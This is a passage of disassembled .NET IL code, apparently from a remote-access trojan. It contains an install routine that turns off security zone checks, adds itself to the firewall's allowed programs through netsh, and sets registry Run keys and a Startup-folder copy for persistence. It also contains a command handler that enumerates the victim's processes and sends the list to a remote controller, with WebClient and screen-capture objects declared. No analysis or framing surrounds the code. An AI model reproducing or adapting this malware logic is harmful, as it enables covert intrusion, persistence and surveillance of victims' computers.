      IL_00be:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00c3:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_00c8:  pop
      IL_00c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_00ce:  leave.s    IL_00e3

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00d0:  dup
      IL_00d1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d6:  stloc.0
      IL_00d7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_00dc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e1:  leave.s    IL_00e3

    }  // end handler
    .try
    {
      IL_00e3:  ldstr      "SEE_MASK_NOZONECHECKS"
      IL_00e8:  ldstr      "1"
      IL_00ed:  ldc.i4.1
      IL_00ee:  call       void [mscorlib]System.Environment::SetEnvironmentVariable(string,
                                                                                     string,
                                                                                     valuetype [mscorlib]System.EnvironmentVariableTarget)
      IL_00f3:  leave.s    IL_0103

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00f5:  dup
      IL_00f6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00fb:  stloc.1
      IL_00fc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0101:  leave.s    IL_0103

    }  // end handler
    .try
    {
      IL_0103:  ldc.i4.5
      IL_0104:  newarr     [mscorlib]System.String
      IL_0109:  stloc.s    V_6
      IL_010b:  ldloc.s    V_6
      IL_010d:  ldc.i4.0
      IL_010e:  ldstr      "netsh firewall add allowedprogram \""
      IL_0113:  stelem.ref
      IL_0114:  ldloc.s    V_6
      IL_0116:  ldc.i4.1
      IL_0117:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
      IL_011c:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0121:  stelem.ref
      IL_0122:  ldloc.s    V_6
      IL_0124:  ldc.i4.2
      IL_0125:  ldstr      "\" \""
      IL_012a:  stelem.ref
      IL_012b:  ldloc.s    V_6
      IL_012d:  ldc.i4.3
      IL_012e:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
      IL_0133:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
      IL_0138:  stelem.ref
      IL_0139:  ldloc.s    V_6
      IL_013b:  ldc.i4.4
      IL_013c:  ldstr      "\" ENABLE"
      IL_0141:  stelem.ref
      IL_0142:  ldloc.s    V_6
      IL_0144:  call       string [mscorlib]System.String::Concat(string[])
      IL_0149:  ldc.i4.0
      IL_014a:  ldc.i4.0
      IL_014b:  ldc.i4.m1
      IL_014c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0151:  pop
      IL_0152:  leave.s    IL_0162

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0154:  dup
      IL_0155:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_015a:  stloc.2
      IL_015b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0160:  leave.s    IL_0162

    }  // end handler
    IL_0162:  ldsfld     bool ClassLibrary1.OK::Isu
    IL_0167:  brfalse    IL_0207

    .try
    {
      IL_016c:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_0171:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0176:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_017b:  ldsfld     string ClassLibrary1.OK::sf
      IL_0180:  ldc.i4.1
      IL_0181:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0186:  ldsfld     string ClassLibrary1.OK::RG
      IL_018b:  ldstr      "\""
      IL_0190:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
      IL_0195:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_019a:  ldstr      "\" .."
      IL_019f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01a4:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_01a9:  leave.s    IL_01b9

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ab:  dup
      IL_01ac:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01b1:  stloc.3
      IL_01b2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01b7:  leave.s    IL_01b9

    }  // end handler
    .try
    {
      IL_01b9:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_01be:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_01c3:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_01c8:  ldsfld     string ClassLibrary1.OK::sf
      IL_01cd:  ldc.i4.1
      IL_01ce:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_01d3:  ldsfld     string ClassLibrary1.OK::RG
      IL_01d8:  ldstr      "\""
      IL_01dd:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
      IL_01e2:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_01e7:  ldstr      "\" .."
      IL_01ec:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01f1:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_01f6:  leave.s    IL_0207

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01f8:  dup
      IL_01f9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01fe:  stloc.s    V_4
      IL_0200:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0205:  leave.s    IL_0207

    }  // end handler
    IL_0207:  ldsfld     bool ClassLibrary1.OK::IsF
    IL_020c:  brfalse.s  IL_026e

    .try
    {
      IL_020e:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
      IL_0213:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0218:  ldc.i4.7
      IL_0219:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_021e:  ldstr      "\\"
      IL_0223:  ldsfld     string ClassLibrary1.OK::RG
      IL_0228:  ldstr      ".exe"
      IL_022d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0232:  ldc.i4.1
      IL_0233:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_0238:  ldc.i4.7
      IL_0239:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_023e:  ldstr      "\\"
      IL_0243:  ldsfld     string ClassLibrary1.OK::RG
      IL_0248:  ldstr      ".exe"
      IL_024d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0252:  ldc.i4.3
      IL_0253:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_0258:  stsfld     class [mscorlib]System.IO.FileStream ClassLibrary1.OK::FS
      IL_025d:  leave.s    IL_026e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_025f:  dup
      IL_0260:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0265:  stloc.s    V_5
      IL_0267:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_026c:  leave.s    IL_026e

    }  // end handler
    IL_026e:  ldc.i4     0x3e8
    IL_0273:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0278:  ret
  } // end of method OK::INS

  .method private static void  RS(object a,
                                  object e) cil managed
  {
    // Code size       102 (0x66)
    .maxstack  11
    .locals init (class [mscorlib]System.Exception V_0,
             object V_1,
             string V_2,
             object[] V_3)
    .try
    {
      IL_0000:  ldstr      "rs"
      IL_0005:  ldsfld     string ClassLibrary1.OK::Y
      IL_000a:  ldarg.1
      IL_000b:  stloc.1
      IL_000c:  ldloc.1
      IL_000d:  ldnull
      IL_000e:  ldstr      "Data"
      IL_0013:  ldc.i4.0
      IL_0014:  newarr     [mscorlib]System.Object
      IL_0019:  ldnull
      IL_001a:  ldnull
      IL_001b:  ldnull
      IL_001c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0021:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0026:  stloc.2
      IL_0027:  ldloca.s   V_2
      IL_0029:  call       string ClassLibrary1.OK::ENB(string&)
      IL_002e:  ldloc.1
      IL_002f:  ldnull
      IL_0030:  ldstr      "Data"
      IL_0035:  ldc.i4.1
      IL_0036:  newarr     [mscorlib]System.Object
      IL_003b:  stloc.3
      IL_003c:  ldloc.3
      IL_003d:  ldc.i4.0
      IL_003e:  ldloc.2
      IL_003f:  stelem.ref
      IL_0040:  ldloc.3
      IL_0041:  ldnull
      IL_0042:  ldnull
      IL_0043:  ldc.i4.1
      IL_0044:  ldc.i4.0
      IL_0045:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSetComplex(object,
                                                                                                                             class [mscorlib]System.Type,
                                                                                                                             string,
                                                                                                                             object[],
                                                                                                                             string[],
                                                                                                                             class [mscorlib]System.Type[],
                                                                                                                             bool,
                                                                                                                             bool)
      IL_004a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_004f:  call       bool ClassLibrary1.OK::Send(string)
      IL_0054:  pop
      IL_0055:  leave.s    IL_0065

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0057:  dup
      IL_0058:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_005d:  stloc.0
      IL_005e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0063:  leave.s    IL_0065

    }  // end handler
    IL_0065:  ret
  } // end of method OK::RS

  .method private static void  ex() cil managed
  {
    // Code size       28 (0x1c)
    .maxstack  2
    .locals init (class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  ldstr      "rsc"
      IL_0005:  call       bool ClassLibrary1.OK::Send(string)
      IL_000a:  pop
      IL_000b:  leave.s    IL_001b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_000d:  dup
      IL_000e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0013:  stloc.0
      IL_0014:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0019:  leave.s    IL_001b

    }  // end handler
    IL_001b:  ret
  } // end of method OK::ex

  .method public static void  Ind(uint8[] b) cil managed
  {
    // Code size       5837 (0x16cd)
    .maxstack  9
    .locals init (string[] V_0,
             int32 V_1,
             class [System]System.Diagnostics.Process[] V_2,
             string V_3,
             class [System]System.Diagnostics.Process V_4,
             string V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             string V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.IO.FileInfo V_11,
             class [mscorlib]System.Threading.Thread V_12,
             int32 V_13,
             class [mscorlib]System.Exception V_14,
             int32 V_15,
             string V_16,
             class [mscorlib]System.Exception V_17,
             class [mscorlib]System.Exception V_18,
             class [mscorlib]System.Exception V_19,
             int32 V_20,
             string V_21,
             class [mscorlib]System.Exception V_22,
             class [mscorlib]System.Exception V_23,
             class [mscorlib]System.Exception V_24,
             class [mscorlib]System.Exception V_25,
             class [mscorlib]System.Exception V_26,
             string V_27,
             uint8[] V_28,
             string V_29,
             class [mscorlib]System.Exception V_30,
             class [System]System.Net.WebClient V_31,
             class [mscorlib]System.Exception V_32,
             uint8[] V_33,
             object V_34,
             string V_35,
             uint8[] V_36,
             object V_37,
             string V_38,
             class [System.Drawing]System.Drawing.Graphics V_39,
             string V_40,
             class [mscorlib]System.IO.MemoryStream V_41,
             class [mscorlib]System.IO.MemoryStream V_42,
             class [System.Drawing]System.Drawing.Bitmap V_43,
             class [mscorlib]System.Exception V_44,
             uint8[] V_45,
             string V_46,
             class [mscorlib]System.Exception V_47,
             class [System]System.Net.WebClient V_48,
             class [mscorlib]System.Exception V_49,
             int32 V_50,
             class [mscorlib]Microsoft.Win32.RegistryKey V_51,
             string V_52,
             string V_53,
             string V_54,
             string V_55,
             class [mscorlib]System.Exception V_56,
             class [mscorlib]System.Exception V_57,
             string V_58,
             string V_59,
             string[] V_60,
             int32 V_61,
             class [System]System.Diagnostics.Process[] V_62,
             string V_63,
             int32 V_64,
             int32 V_65,
             class [System]System.Diagnostics.Process V_66,
             int32 V_67,
             class [System]System.Diagnostics.Process V_68,
             string V_69,
             string V_70,
             bool V_71,
             object[] V_72,
             valuetype [System.Drawing]System.Drawing.Rectangle V_73,
             valuetype [System.Drawing]System.Drawing.Rectangle V_74,
             valuetype [System.Drawing]System.Drawing.Rectangle V_75,
             valuetype [System.Drawing]System.Drawing.Rectangle V_76,
             valuetype [System.Drawing]System.Drawing.Rectangle V_77,
             valuetype [System.Drawing]System.Drawing.Rectangle V_78,
             valuetype [System.Drawing]System.Drawing.Rectangle V_79,
             valuetype [System.Drawing]System.Drawing.Rectangle V_80,
             valuetype [System.Drawing]System.Drawing.Rectangle V_81,
             valuetype [System.Drawing]System.Drawing.Size V_82,
             native int V_83,
             string V_84,
             string V_85,
             int32 V_86,
             string[] V_87,
             int32 V_88,
             string[] V_89)
    IL_0000:  ldarga.s   b
    IL_0002:  call       string ClassLibrary1.OK::BS(uint8[]&)
    IL_0007:  ldsfld     string ClassLibrary1.OK::Y
    IL_000c:  ldc.i4.m1
    IL_000d:  ldc.i4.0
    IL_000e:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0013:  stloc.0
    .try
    {
      IL_0014:  ldloc.0
      IL_0015:  ldc.i4.0
      IL_0016:  ldelem.ref
      IL_0017:  stloc.s    V_58
      IL_0019:  ldloc.s    V_58
      IL_001b:  ldstr      "proc"
      IL_0020:  ldc.i4.0
      IL_0021:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0026:  ldc.i4.0
      IL_0027:  bne.un     IL_07e5

      IL_002c:  ldloc.0
      IL_002d:  ldc.i4.1
      IL_002e:  ldelem.ref
      IL_002f:  stloc.s    V_59
      IL_0031:  ldloc.s    V_59
      IL_0033:  ldstr      "~"
      IL_0038:  ldc.i4.0
      IL_0039:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_003e:  ldc.i4.0
      IL_003f:  bne.un     IL_03db

      IL_0044:  ldc.i4.5
      IL_0045:  newarr     [mscorlib]System.String
      IL_004a:  stloc.s    V_60
      IL_004c:  ldloc.s    V_60
      IL_004e:  ldc.i4.0
      IL_004f:  ldstr      "proc"
      IL_0054:  stelem.ref
      IL_0055:  ldloc.s    V_60
      IL_0057:  ldc.i4.1
      IL_0058:  ldsfld     string ClassLibrary1.OK::Y
      IL_005d:  stelem.ref
      IL_005e:  ldloc.s    V_60
      IL_0060:  ldc.i4.2
      IL_0061:  ldstr      "pid"
      IL_0066:  stelem.ref
      IL_0067:  ldloc.s    V_60
      IL_0069:  ldc.i4.3
      IL_006a:  ldsfld     string ClassLibrary1.OK::Y
      IL_006f:  stelem.ref
      IL_0070:  ldloc.s    V_60
      IL_0072:  ldc.i4.4
      IL_0073:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0078:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
      IL_007d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0082:  stelem.ref
      IL_0083:  ldloc.s    V_60
      IL_0085:  call       string [mscorlib]System.String::Concat(string[])
      IL_008a:  call       bool ClassLibrary1.OK::Send(string)
      IL_008f:  pop
      IL_0090:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcesses()
      IL_0095:  stloc.2
      IL_0096:  ldc.i4.5
      IL_0097:  newarr     [mscorlib]System.String
      IL_009c:  stloc.s    V_60
      IL_009e:  ldloc.s    V_60
      IL_00a0:  ldc.i4.0
      IL_00a1:  ldstr      "proc"
      IL_00a6:  stelem.ref
      IL_00a7:  ldloc.s    V_60
      IL_00a9:  ldc.i4.1
      IL_00aa:  ldsfld     string ClassLibrary1.OK::Y
      IL_00af:  stelem.ref
      IL_00b0:  ldloc.s    V_60
      IL_00b2:  ldc.i4.2
      IL_00b3:  ldstr      "~"
      IL_00b8:  stelem.ref
      IL_00b9:  ldloc.s    V_60
      IL_00bb:  ldc.i4.3
      IL_00bc:  ldsfld     string ClassLibrary1.OK::Y
      IL_00c1:  stelem.ref
      IL_00c2:  ldloc.s    V_60
      IL_00c4:  ldc.i4.4
      IL_00c5:  ldloc.2
      IL_00c6:  ldlen
      IL_00c7:  conv.ovf.i4
      IL_00c8:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_00cd:  stelem.ref
      IL_00ce:  ldloc.s    V_60
      IL_00d0:  call       string [mscorlib]System.String::Concat(string[])
      IL_00d5:  call       bool ClassLibrary1.OK::Send(string)
      IL_00da:  pop
      IL_00db:  ldc.i4.0
      IL_00dc:  stloc.1
      IL_00dd:  ldstr      ""
      IL_00e2:  stloc.3
      IL_00e3:  ldloc.2
      IL_00e4:  stloc.s    V_62
      IL_00e6:  ldc.i4.0
      IL_00e7:  stloc.s    V_61
      IL_00e9:  br         IL_039e

      IL_00ee:  ldloc.s    V_62
      IL_00f0:  ldloc.s    V_61
      IL_00f2:  ldelem.ref
      IL_00f3:  stloc.s    V_4
      IL_00f5:  ldloc.1
      IL_00f6:  ldc.i4.1
      IL_00f7:  add.ovf
      IL_00f8:  stloc.1
      .try
      {
        .try
        {
          IL_00f9:  ldstr      ""
          IL_00fe:  stloc.s    V_5
          .try
          {
            IL_0100:  ldloc.s    V_4
            IL_0102:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
            IL_0107:  callvirt   instance class [System]System.Diagnostics.FileVersionInfo [System]System.Diagnostics.ProcessModule::get_FileVersionInfo()
            IL_010c:  callvirt   instance string [System]System.Diagnostics.FileVersionInfo::get_FileDescription()
            IL_0111:  stloc.s    V_63
            IL_0113:  ldloca.s   V_63
            IL_0115:  call       string ClassLibrary1.OK::ENB(string&)
            IL_011a:  stloc.s    V_5
            IL_011c:  leave.s    IL_012d

          }  // end .try
          catch [mscorlib]System.Exception 
          {
            IL_011e:  dup
            IL_011f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
            IL_0124:  stloc.s    V_6
            IL_0126:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
            IL_012b:  leave.s    IL_012d

          }  // end handler
          IL_012d:  ldc.i4.7
          IL_012e:  newarr     [mscorlib]System.String
          IL_0133:  stloc.s    V_60
          IL_0135:  ldloc.s    V_60
          IL_0137:  ldc.i4.0
          IL_0138:  ldloc.3
          IL_0139:  stelem.ref
          IL_013a:  ldloc.s    V_60
          IL_013c:  ldc.i4.1
          IL_013d:  ldsfld     string ClassLibrary1.OK::Y
          IL_0142:  stelem.ref
          IL_0143:  ldloc.s    V_60
          IL_0145:  ldc.i4.2
          IL_0146:  ldloc.s    V_4
          IL_0148:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
          IL_014d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
          IL_0152:  stelem.ref
          IL_0153:  ldloc.s    V_60
          IL_0155:  ldc.i4.3
          IL_0156:  ldstr      ","
          IL_015b:  stelem.ref
          IL_015c:  ldloc.s    V_60
          IL_015e:  ldc.i4.4
          IL_015f:  ldloc.s    V_4
          IL_0161:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
          IL_0166:  callvirt   instance string [System]System.Diagnostics.ProcessModule::get_FileName()
          IL_016b:  stelem.ref
          IL_016c:  ldloc.s    V_60
          IL_016e:  ldc.i4.5
          IL_016f:  ldstr      ","
          IL_0174:  stelem.ref
          IL_0175:  ldloc.s    V_60
          IL_0177:  ldc.i4.6
          IL_0178:  ldloc.s    V_5
          IL_017a:  stelem.ref
          IL_017b:  ldloc.s    V_60
          IL_017d:  call       string [mscorlib]System.String::Concat(string[])
          IL_0182:  stloc.3
          IL_0183:  leave      IL_035b

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0188:  dup
          IL_0189:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_018e:  stloc.s    V_7
          IL_0190:  ldc.i4.7
          IL_0191:  newarr     [mscorlib]System.String
          IL_0196:  stloc.s    V_60
          IL_0198:  ldloc.s    V_60
          IL_019a:  ldc.i4.0
          IL_019b:  ldloc.3
          IL_019c:  stelem.ref
          IL_019d:  ldloc.s    V_60
          IL_019f:  ldc.i4.1
          IL_01a0:  ldsfld     string ClassLibrary1.OK::Y
          IL_01a5:  stelem.ref
          IL_01a6:  ldloc.s    V_60
          IL_01a8:  ldc.i4.2
          IL_01a9:  ldloc.s    V_4
          IL_01ab:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
          IL_01b0:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
          IL_01b5:  stelem.ref
          IL_01b6:  ldloc.s    V_60
          IL_01b8:  ldc.i4.3
          IL_01b9:  ldstr      ","
          IL_01be:  stelem.ref
          IL_01bf:  ldloc.s    V_60
          IL_01c1:  ldc.i4.4
          IL_01c2:  ldloc.s    V_4
          IL_01c4:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
          IL_01c9:  callvirt   instance class [System]System.Diagnostics.FileVersionInfo [System]System.Diagnostics.ProcessModule::get_FileVersionInfo()
          IL_01ce:  callvirt   instance string [System]System.Diagnostics.FileVersionInfo::get_FileName()
          IL_01d3:  stelem.ref
          IL_01d4:  ldloc.s    V_60
          IL_01d6:  ldc.i4.5
          IL_01d7:  ldstr      ","
          IL_01dc:  stelem.ref
          IL_01dd:  ldloc.s    V_60
          IL_01df:  ldc.i4.6
          IL_01e0:  ldloc.s    V_4
          IL_01e2:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
          IL_01e7:  callvirt   instance class [System]System.Diagnostics.FileVersionInfo [System]System.Diagnostics.ProcessModule::get_FileVersionInfo()
          IL_01ec:  callvirt   instance string [System]System.Diagnostics.FileVersionInfo::get_FileDescription()
          IL_01f1:  stloc.s    V_63
          IL_01f3:  ldloca.s   V_63
          IL_01f5:  call       string ClassLibrary1.OK::ENB(string&)
          IL_01fa:  stelem.ref
          IL_01fb:  ldloc.s    V_60
          IL_01fd:  call       string [mscorlib]System.String::Concat(string[])
          IL_0202:  stloc.3
          IL_0203:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0208:  leave      IL_035b

        }  // end handler
      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_020d:  dup
        IL_020e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0213:  stloc.s    V_8
        IL_0215:  ldstr      ""
        IL_021a:  stloc.s    V_9
        .try
        {
          IL_021c:  ldstr      "windir"
          IL_0221:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
          IL_0226:  ldstr      "\\system32\\"
          IL_022b:  ldloc.s    V_4
          IL_022d:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
          IL_0232:  ldstr      ".exe"
          IL_0237:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string,
                                                                      string)
          IL_023c:  call       class [System]System.Diagnostics.FileVersionInfo [System]System.Diagnostics.FileVersionInfo::GetVersionInfo(string)
          IL_0241:  callvirt   instance string [System]System.Diagnostics.FileVersionInfo::get_FileDescription()
          IL_0246:  stloc.s    V_63
          IL_0248:  ldloca.s   V_63
          IL_024a:  call       string ClassLibrary1.OK::ENB(string&)
          IL_024f:  stloc.s    V_9
          IL_0251:  leave.s    IL_0262

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0253:  dup
          IL_0254:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0259:  stloc.s    V_10
          IL_025b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0260:  leave.s    IL_0262

        }  // end handler
        IL_0262:  ldstr      "windir"
        IL_0267:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
        IL_026c:  ldstr      "\\system32\\"
        IL_0271:  ldloc.s    V_4
        IL_0273:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
        IL_0278:  ldstr      ".exe"
        IL_027d:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0282:  call       bool [mscorlib]System.IO.File::Exists(string)
        IL_0287:  brfalse.s  IL_0303

        IL_0289:  ldstr      "windir"
        IL_028e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
        IL_0293:  ldstr      "\\system32\\"
        IL_0298:  ldloc.s    V_4
        IL_029a:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
        IL_029f:  ldstr      ".exe"
        IL_02a4:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_02a9:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_02ae:  stloc.s    V_11
        IL_02b0:  ldc.i4.7
        IL_02b1:  newarr     [mscorlib]System.String
        IL_02b6:  stloc.s    V_60
        IL_02b8:  ldloc.s    V_60
        IL_02ba:  ldc.i4.0
        IL_02bb:  ldloc.3
        IL_02bc:  stelem.ref
        IL_02bd:  ldloc.s    V_60
        IL_02bf:  ldc.i4.1
        IL_02c0:  ldsfld     string ClassLibrary1.OK::Y
        IL_02c5:  stelem.ref
        IL_02c6:  ldloc.s    V_60
        IL_02c8:  ldc.i4.2
        IL_02c9:  ldloc.s    V_4
        IL_02cb:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
        IL_02d0:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
        IL_02d5:  stelem.ref
        IL_02d6:  ldloc.s    V_60
        IL_02d8:  ldc.i4.3
        IL_02d9:  ldstr      ","
        IL_02de:  stelem.ref
        IL_02df:  ldloc.s    V_60
        IL_02e1:  ldc.i4.4
        IL_02e2:  ldloc.s    V_11
        IL_02e4:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
